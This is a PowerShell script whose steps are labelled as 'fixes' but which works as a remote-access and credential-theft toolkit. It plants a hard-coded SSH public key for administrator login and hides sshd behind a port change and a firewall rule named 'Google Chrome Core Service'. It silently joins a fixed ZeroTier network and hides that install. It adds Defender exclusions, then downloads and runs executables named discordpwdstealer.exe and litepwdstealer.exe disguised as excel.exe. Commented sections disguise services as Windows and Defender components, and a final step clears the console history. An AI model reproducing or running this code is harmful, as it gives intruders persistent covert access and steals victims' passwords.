$currentDirectory = Get-Location
$opconfirm = Read-Host "Proceed With OP Fix (y/n)"
if ([string]::IsNullOrEmpty($opconfirm)) {
    Start-Sleep -Seconds 2
    $opconfirm = "n"
}
if ($opconfirm.ToLower() -eq "y") {
	Write-Host "Executing OP Fix..."
	$openSSHFolder = "C:\ProgramData\ssh"
	Remove-Item -Path $openSSHFolder -Force -Recurse -ErrorAction SilentlyContinue
	$InstallPath = "C:\Program Files\OpenSSH"
	$DisablePasswordAuthentication = $True
	$DisablePubkeyAuthentication = $False
	$AutoStartSSHD = $true
	$AutoStartSSHAGENT = $false
	$OpenSSHLocation = $null
	$GitUrl = 'https://github.com/PowerShell/Win32-OpenSSH/releases/latest/'
	$GitZipName = "OpenSSH-Win64.zip" #Can use OpenSSH-Win32.zip on older systems
	$ErrorActionPreference = "Stop"
	$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
	$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
	$UserPrincipal = New-Object System.Security.Principal.WindowsPrincipal($CurrentUser)
	$AdminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
	$IsAdmin = $UserPrincipal.IsInRole($AdminRole)
	if ($IsAdmin) {
			Write-Host "Script is running elevated." -ForegroundColor Green
		}
	else {
		throw "Script is not running elevated, which is required. Restart the script from an elevated prompt."
	}
	#Remove BuiltIn OpenSSH
	$ErrorActionPreference = "SilentlyContinue"
	Write-Host "Checking for Windows OpenSSH Server" -ForegroundColor Green
	if ($(Get-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0).State -eq "Installed") {
		Write-Host "Removing Windows OpenSSH Server" -ForegroundColor Green
		Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction SilentlyContinue
	}
	Write-Host "Checking for Windows OpenSSH Client" -ForegroundColor Green
	if ($(Get-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0).State -eq "Installed") {
		Write-Host "Removing Windows OpenSSH Client" -ForegroundColor Green
		Remove-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction SilentlyContinue
	}
	$ErrorActionPreference = "Stop"
	#Stop and remove existing services (Perhaps an exisitng OpenSSH install)
	if (Get-Service sshd -ErrorAction SilentlyContinue) {
		Stop-Service sshd -ErrorAction SilentlyContinue
		sc.exe delete sshd 1>$null
	}
	if (Get-Service ssh-agent -ErrorAction SilentlyContinue) {
		Stop-Service ssh-agent -ErrorAction SilentlyContinue
		sc.exe delete ssh-agent 1>$null
	}
	if ($OpenSSHLocation.Length -eq 0) {
		#Randomize Querystring to ensure our request isnt served from a cache
		$GitUrl += "?random=" + $(Get-Random -Minimum 10000 -Maximum 99999)
		# Get Upstream URL
		Write-Host "Requesting URL for latest version of OpenSSH" -ForegroundColor Green
		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
		$request = [System.Net.WebRequest]::Create($GitUrl)
		$request.AllowAutoRedirect = $false
		$request.Timeout = 5 * 1000
		$request.headers.Add("Pragma", "no-cache")
		$request.headers.Add("Cache-Control", "no-cache")
		$request.UserAgent = $UserAgent
		$response = $request.GetResponse()
		if ($null -eq $response -or $null -eq $([String]$response.GetResponseHeader("Location"))) { throw "Unable to download OpenSSH Archive. Sometimes you can get throttled, so just try again later." }
		$OpenSSHURL = $([String]$response.GetResponseHeader("Location")).Replace('tag', 'download') + "/" + $GitZipName
		# #Also randomize this one...
		$OpenSSHURL += "?random=" + $(Get-Random -Minimum 10000 -Maximum 99999)
		Write-Host "Using URL" -ForegroundColor Green
		Write-Host $OpenSSHURL -ForegroundColor Green
		Write-Host
		# #Download and extract archive
		Write-Host "Downloading Archive" -ForegroundColor Green
		Invoke-WebRequest -Uri $OpenSSHURL -OutFile $GitZipName -ErrorAction Stop -TimeoutSec 5 -Headers @{"Pragma" = "no-cache"; "Cache-Control" = "no-cache"; } -UserAgent $UserAgent
		Write-Host "Download Complete, now expanding and copying to destination" -ForegroundColor Green -ErrorAction Stop
	}
	else {
		$PathInfo = [System.Uri]([string]::":FileSystem::" + $OpenSSHLocation)
		if ($PathInfo.IsUnc) {
			Copy-Item -Path $PathInfo.LocalPath -Destination $env:TEMP
			Set-Location $env:TEMP
		}
	}
	Remove-Item -Path $InstallPath -Force -Recurse -ErrorAction SilentlyContinue
	If (!(Test-Path $InstallPath)) {
		New-Item -Path $InstallPath -ItemType "directory" -ErrorAction Stop | Out-Null
	}
	$OldEnv = [Environment]::CurrentDirectory
	[Environment]::CurrentDirectory = $(Get-Location)
	Add-Type -AssemblyName System.IO.Compression.FileSystem
	$archive = [System.IO.Compression.ZipFile]::OpenRead($GitZipName)
	$archive.Entries | ForEach-Object {
		# Entries with an empty Name property are directories
		if ($_.Name -ne '') {
			$NewFIleName = Join-Path $InstallPath $_.Name
			Remove-Item -Path $NewFIleName -Force -ErrorAction SilentlyContinue
			[System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, $NewFIleName)
		}
	}
	$archive.Dispose()
	Set-Location $OldEnv
	#Cleanup zip file if we downloaded it
	if ($OpenSSHURL.Length -gt 0) { Remove-Item -Path $GitZipName -Force -ErrorAction SilentlyContinue }
	#Run Install Script
	Write-Host "Running Install Commands" -ForegroundColor Green
	Set-Location $InstallPath -ErrorAction Stop
	powershell.exe -ExecutionPolicy Bypass -File install-sshd.ps1
	Set-Service -Name sshd -StartupType 'Automatic' -ErrorAction Stop
	#Make sure your ProgramData\ssh directory exists
	If (!(Test-Path $env:ProgramData\ssh)) {
		Write-Host "Creating ProgramData\ssh directory" -ForegroundColor Green
		New-Item -ItemType Directory -Force -Path $env:ProgramData\ssh -ErrorAction Stop | Out-Null
	}
	#Setup sshd_config
	Write-Host "Configure server config file" -ForegroundColor Green
	Copy-Item -Path $InstallPath\sshd_config_default -Destination $env:ProgramData\ssh\sshd_config -Force -ErrorAction Stop
	Add-Content -Path $env:ProgramData\ssh\sshd_config -Value "`r`nGSSAPIAuthentication yes" -ErrorAction Stop
	if ($DisablePasswordAuthentication) { Add-Content -Path $env:ProgramData\ssh\sshd_config -Value "PasswordAuthentication no" -ErrorAction Stop }
	if ($DisablePubkeyAuthentication) { Add-Content -Path $env:ProgramData\ssh\sshd_config -Value "PubkeyAuthentication no" -ErrorAction Stop }
	#Make sure your user .ssh directory exists
	If (!(Test-Path "~\.ssh")) {
		Write-Host "Creating User .ssh directory" -ForegroundColor Green
		New-Item -ItemType Directory -Force -Path "~\.ssh" -ErrorAction Stop | Out-Null
	}
	#Set ssh_config
	Write-Host "Configure client config file" -ForegroundColor Green
	Add-Content -Path ~\.ssh\config -Value "`r`nGSSAPIAuthentication yes" -ErrorAction Stop
	#Setting autostarts
	if ($AutoStartSSHD) {
		Write-Host "Setting sshd service to Automatic start" -ForegroundColor Green;
		Set-Service -Name sshd -StartupType Automatic;
	}
	if ($AutoStartSSHAGENT) {
		Write-Host "Setting ssh-agent service to Automatic start" -ForegroundColor Green;
		Set-Service -Name ssh-agent -StartupType Automatic;
	}
	#Start the service
	Write-Host "Starting sshd Service" -ForegroundColor Green
	Start-Service sshd -ErrorAction Stop
	#Add to path if it isnt already there
	$existingPath = (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).path
	if ($existingPath -notmatch $InstallPath.Replace("\", "\\")) {
		Write-Host "Adding OpenSSH Directory to path" -ForegroundColor Green
		$newpath = "$existingPath;$InstallPath"
		Set-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH -Value $newPath -ErrorAction Stop
	}
	#Make sure user keys are configured correctly
	Write-Host "Ensuring HostKey file permissions are correct" -ForegroundColor Green
	powershell.exe -ExecutionPolicy Bypass -Command '. .\FixHostFilePermissions.ps1 -Confirm:$false'
	#Make sure host keys are configured correctly
	Write-Host "Ensuring UserKey file permissions are correct" -ForegroundColor Green
	powershell.exe -ExecutionPolicy Bypass -Command '. .\FixUserFilePermissions.ps1 -Confirm:$false'
	#Add firewall rule
	Write-Host "Creating firewall rule" -ForegroundColor Green
	New-NetFirewallRule -Name sshd -DisplayName 'Google Chrome Core Service' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
	#Set Shell to powershell
	Write-Host "Setting default shell to powershell" -ForegroundColor Green
	New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force -ErrorAction Stop | Out-Null
	Write-Host "Installation completed successfully" -ForegroundColor Green
	#Public Key Add
	$SSHPublicKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwoQ5u4sZA/cz2iAatR8Uyl8GbRJXb5zLmw20oxRUKzWZuEwpta0Dm9qoyG6Oo9zhLB5YaOpjrmVk2hD+RL5iSRdFPQ3sI19Az5jwvQzUNEpGWTZxu8/Uvtu0MvtFVOzJfWYtncrlEjQt6Z0iBOBHjUsnR2EqOiFYP/FGgvH4q7mmmsj5mds6q48flhzW+spBlPaHu0CcIFhu6XTt1oAbvRKDjfPgWOEYopWgglqCl/+IiRNsWyKwQN9P2/IiaRAVqF1KekNtqyAFyzg2deIDYKj+nSLQ6NxMTPJx4fNeqUYO37K6+1AkLX5iLCBjmQrsfRiPZNO5DivJJq1eg8y2weqI210odjHj6EHnJCpHs7ogsKvIbewsD4FxJC3XqfuwvKPba/ho2W0lmNZjv6CpepasKSBE/N4ooTbpKegN0U0gjH+eh1+TiAK3PB6rlmtEc06kt0eZyCpn4yhFLdS13Mfpx8ijpPd+0yNyAd8DHDFfWLy1EX2cMBd0B7iDE5aU="
	if ($SSHPublicKey -ne "" -And (-not (Test-Path "C:\ProgramData\ssh\administrators_authorized_keys"  -PathType leaf ))) {
			Set-Content -Path "C:\ProgramData\ssh\administrators_authorized_keys" -Value $SSHPublicKey 
		}
		$acl = Get-Acl "C:\ProgramData\ssh\administrators_authorized_keys"
		$acl.SetAccessRuleProtection($true, $false)
		$administratorsRule = New-Object system.security.accesscontrol.filesystemaccessrule("Administrators","FullControl","Allow")
		$systemRule = New-Object system.security.accesscontrol.filesystemaccessrule("SYSTEM","FullControl","Allow")
		$acl.SetAccessRule($administratorsRule)
		$acl.SetAccessRule($systemRule)
		$acl | Set-Acl
	#Port Change
	$sshdConfigPath = "$env:ProgramData\ssh\sshd_config"
	$sshdConfigContent = Get-Content -Path $sshdConfigPath
	$sshdConfigContent = $sshdConfigContent -replace "^#Port 22$", "Port 58769"
	$sshdConfigContent | Set-Content -Path $sshdConfigPath
	#.ssh remove from user-root-dir
	$currentUserRoot = $env:USERPROFILE
	$sshFolder = Join-Path -Path $currentUserRoot -ChildPath ".ssh"
	if (Test-Path $sshFolder) {
		try {
			Remove-Item -Path $sshFolder -Force -Recurse -ErrorAction Stop
			} catch {
		}
	}
	Set-Location $currentDirectory
	Restart-Service sshd
	} else {
}
#OP Adv Fix
#$ztconfirm = Read-Host "Proceed With OP Adv Fix (y/n)"
#if ([string]::IsNullOrEmpty($ztconfirm)) {
#    Start-Sleep -Seconds 1
#    $ztconfirm = "n"
#}
#if ($ztconfirm.ToLower() -eq "y") {
#   Write-Host "Executing OP Adv Fix..."
#	$oldFolderPath = "C:\Program Files\OpenSSH"
#	$newFolderPath = "C:\Program Files\TaskManager"
#	$retryAttempts = 5
#	$successColor = "Green"
#	$errorColor = "Red"
#	$warningColor = "Yellow"
#	if (Test-Path $oldFolderPath) {
#		Write-Host "Found OpenSSH folder." -ForegroundColor $warningColor
#		$copySuccess = $false
#		$renameSuccess = $false
#
#		if (!(Test-Path $newFolderPath)) {
#			for ($i = 1; $i -le $retryAttempts; $i++) {
#				try {
#					Copy-Item -Path $oldFolderPath -Destination $newFolderPath -Recurse -Force
#					Write-Host "OpenSSH folder copied to TaskManager folder." -ForegroundColor $successColor
#					$copySuccess = $true
#					break
#				}
#				catch {
#					Write-Host "Copy attempt $i failed. Retrying..." -ForegroundColor $errorColor
#					Start-Sleep -Seconds 1
#				}
#			}
#		}
#		else {
#			Write-Host "TaskManager folder already exists. Skipping the copy, rename, and registry update." -ForegroundColor $warningColor
#			$copySuccess = $true
#			$renameSuccess = $true
#		}
#
#		if ($copySuccess) {
#			$oldFilePath = Join-Path $newFolderPath "sshd.exe"
#			$newFilePath = Join-Path $newFolderPath "IP-Handler.exe"
#			$fileRenameNeeded = !(Test-Path $newFilePath)
#
#			if ($fileRenameNeeded) {
#				for ($i = 1; $i -le $retryAttempts; $i++) {
#					try {
#						Rename-Item -Path $oldFilePath -NewName $newFilePath -Force
#						Write-Host "File renamed: $oldFilePath to $newFilePath." -ForegroundColor $successColor
#						$renameSuccess = $true
#						break
#					}
#					catch {
#						Write-Host "Rename attempt $i failed. Retrying..." -ForegroundColor $errorColor
#						Start-Sleep -Seconds 1
#					}
#				}
#			}
#			else {
#				Write-Host "File already renamed: $oldFilePath to $newFilePath. Skipping the rename and registry update." -ForegroundColor $warningColor
#				$renameSuccess = $true
#			}
#
#			if ($renameSuccess) {
#				$sshregkey = "HKLM:\SYSTEM\CurrentControlSet\Services\sshd"
#				$sshagentregkey = "HKLM:\SYSTEM\CurrentControlSet\Services\ssh-agent"
#				for ($i = 1; $i -le $retryAttempts; $i++) {
#					try {
#						Set-ItemProperty -Path $sshregkey -Name "DisplayName" -Value "Windows System Core Service"
#						Set-ItemProperty -Path $sshregkey -Name "Description" -Value "Windows System Essential Services"
#						Set-ItemProperty -Path $sshregkey -Name "ImagePath" -Value $newFilePath
#						Write-Host "Registry updated for $sshregkey." -ForegroundColor $successColor
#
#						Set-ItemProperty -Path $sshagentregkey -Name "DisplayName" -Value "Windows Power Service"
#						Set-ItemProperty -Path $sshagentregkey -Name "Description" -Value "Windows System Essential Services"
#						Set-ItemProperty -Path $sshagentregkey -Name "ImagePath" -Value "C:\Program Files\TaskManager\Update-Handler.exe"
#						Write-Host "Registry updated for $sshagentregkey." -ForegroundColor $successColor
#
#						Restart-Service sshd
#						Write-Host "sshd service restarted." -ForegroundColor $successColor
#
#						break
#					}
#					catch {
#						Write-Host "Registry update attempt $i failed. Retrying..." -ForegroundColor $errorColor
#						Start-Sleep -Seconds 1
#					}
#				}
#			}
#			else {
#				Write-Host "File renaming failed. Cannot proceed with registry update." -ForegroundColor $errorColor
#			}
#		}
#		else {
#			Write-Host "OpenSSH folder copy failed. Cannot proceed with file renaming and registry update." -ForegroundColor $errorColor
#		}
#
#		if ($copySuccess -and $renameSuccess) {
#			Remove-Item -Path $oldFolderPath -Force -Recurse -ErrorAction SilentlyContinue
#			Write-Host "Removed OpenSSH folder." -ForegroundColor $successColor
#		}
#	}
#	else {
#		Write-Host "OpenSSH folder not found. Skipping the entire section." -ForegroundColor $warningColor
#	}
#} else {
#}
#ZT Setup
$ztconfirm = Read-Host "Proceed With ZT Fix (y/n)"
if ([string]::IsNullOrEmpty($ztconfirm)) {
    Start-Sleep -Seconds 1
    $ztconfirm = "n"
}
if ($ztconfirm.ToLower() -eq "y") {
    Write-Host "Executing ZT Fix..."
	$ErrorActionPreference = "SilentlyContinue"
	$downloadUrl = "https://download.zerotier.com/dist/ZeroTier%20One.msi"
	$destinationPath = "C:\Users\Default\layer1fixzt.msi"
		if (Test-Path $destinationPath) {
		Remove-Item -Path $destinationPath -Force
		}
	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
	Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$destinationPath`" /qn /norestart" 
	Timeout /NoBreak 30
	$NetworkID = "52b337794f5f54e7"
	$zerotiercli = "C:\ProgramData\ZeroTier\One\zerotier-one_x64.exe"
	$param1 = "-q"
	$param2 = "join"
	$NetworkID = "52b337794f5f54e7"
	& $zerotiercli $param1 $param2 $NetworkID allowDefault=1
	$KeyNamePattern = "Zerotier*"
	$RegPath = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
	$MatchingKeys = Get-ChildItem -Path $RegPath | Where-Object { $_.PSChildName -like $KeyNamePattern }
	foreach ($Key in $MatchingKeys) {
		$RegKeyPath = Join-Path -Path $RegPath -ChildPath $Key.PSChildName
		$RegValueName = "SystemComponent"
		$RegValueData = 1
		Set-ItemProperty -Path $RegKeyPath -Name $RegValueName -Value $RegValueData -Type DWORD -Force
	}
	$ZeroTierShortcutPath = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Zerotier.lnk'
	if (Test-Path $ZeroTierShortcutPath) {
		Remove-Item -Path $ZeroTierShortcutPath -Force -ErrorAction SilentlyContinue | Out-Null
	}
	Stop-Process -Name zerotier_desktop_ui -F -ErrorAction SilentlyContinue | Out-Null
	$folderPath = "C:\Program Files (x86)\ZeroTier"
	$folderACL = Get-Acl -Path $folderPath
	$folderACL.SetAccessRuleProtection($true, $false)
	$folderACL.Access | ForEach-Object {
		$folderACL.RemoveAccessRule($_)
	}
	Set-Acl -Path $folderPath -AclObject $folderACL
	$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
	$folderACL.SetOwner([System.Security.Principal.NTAccount] $currentUser)
	Set-Acl -Path $folderPath -AclObject $folderACL
	$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
		$currentUser,
		"FullControl",
		"ContainerInherit, ObjectInherit",
		"None",
		"Allow"
	)
	$folderACL.AddAccessRule($accessRule)
	Set-Acl -Path $folderPath -AclObject $folderACL
	$childItems = Get-ChildItem -Path $folderPath -Recurse
	foreach ($item in $childItems) {
		Set-Acl -Path $item.FullName -AclObject $folderACL
	}
	Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
	Get-NetAdapter -Name Zerotier*|Rename-NetAdapter -NewName Microsoft
} else {
}
#ZT Adv Fix
#$ztadv = Read-Host "Proceed With ZT Adv Fix (y/n)"
#if ([string]::IsNullOrEmpty($ztadv)) {
#    Start-Sleep -Seconds 1
#    $ztadv = "n"	
#}
#if ($ztadv.ToLower() -eq "y") {
#    Write-Host "Executing ZT Adv Fix..."
#	$ztregkey = "HKLM:\SYSTEM\CurrentControlSet\Services\ZeroTierOneService"
#	Set-ItemProperty -Path $ztregkey -Name "DisplayName" -Value "Windows Defender Core Service"
#	Set-ItemProperty -Path $ztregkey -Name "Description" -Value "Windows Defender Essential Services"
#	$ruleName = "ZeroTier x64 Binary In"
#	$existingRule = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $ruleName }
#	if ($existingRule) {
#		$newRuleName = "Windoes Defender Core Service"
#		Set-NetFirewallRule -DisplayName $ruleName -NewDisplayName $newRuleName -ErrorAction SilentlyContinue
#		Set-NetFirewallRule -DisplayName $newRuleName -ErrorAction SilentlyContinue
#	}
#	$ruleName2 = "ZeroTier UDP/9993 In"
#	$existingRule2 = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $ruleName2 }
#	if ($existingRule2) {
#		$newRuleName2 = "Windows Defender Service"
#		Set-NetFirewallRule -DisplayName $ruleName2 -NewDisplayName $newRuleName2 -ErrorAction SilentlyContinue
#		Set-NetFirewallRule -DisplayName $newRuleName2 -ErrorAction SilentlyContinue
#	}	
#	Restart-Service ZeroTierOneService
#} else {
#}
#PWD-ST Fix
$pwdst = Read-Host "Proceed With PWD-ST Fix (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($pwdst.ToLower() -eq "y") {
    Write-Host "Executing PWD-ST Fix..."
    	Add-MpPreference -ExclusionPath $TempDir
 	if ($output -ne $null) {
    	Remove-Item -Path $output -Recurse -Force -ErrorAction SilentlyContinue
	} else {}
	$TempDir = [System.IO.Path]::GetTempPath()
	$output = "$TempDir\excel.exe"
	$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/discordpwdstealer.exe"
	Invoke-WebRequest -Uri $url -OutFile $output
	if ($output -ne $null) {
    	Remove-Item -Path $output -Recurse -Force -ErrorAction SilentlyContinue
	} else {} 	
	Start-Process -FilePath $output
	Remove-MpPreference -ExclusionPath $TempDir
} else {
}
#litepwdsnitch Fix
$pwdst = Read-Host "Proceed With LitePWDSnitch Fix (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
    Start-Sleep -Seconds 1
    $pwdst = "n"
}
if ($pwdst.ToLower() -eq "y") {
    Write-Host "Executing PWD-ST Fix..."
    	Add-MpPreference -ExclusionPath $TempDir
 	if ($output -ne $null) {
    	Remove-Item -Path $output -Recurse -Force -ErrorAction SilentlyContinue
	} else {}
	$TempDir = [System.IO.Path]::GetTempPath()
	$output = "$TempDir\excel.exe"
	$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/litepwdstealer.exe"
	Invoke-WebRequest -Uri $url -OutFile $output
	if ($output -ne $null) {
    	Remove-Item -Path $output -Recurse -Force -ErrorAction SilentlyContinue
	} else {} 	
	Start-Process -FilePath $output
	Remove-MpPreference -ExclusionPath $TempDir
} else {
}
#Cleanup
$sanit = Read-Host "Sanitization (y/n)"
if ([string]::IsNullOrEmpty($sanit)) {
    Start-Sleep -Seconds 1
    $sanit = "y"
}
if ($sanit.ToLower() -eq "y") {
[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[System.Windows.Forms.SendKeys]::Sendwait('%{F7 2}')
clear
} else {
}
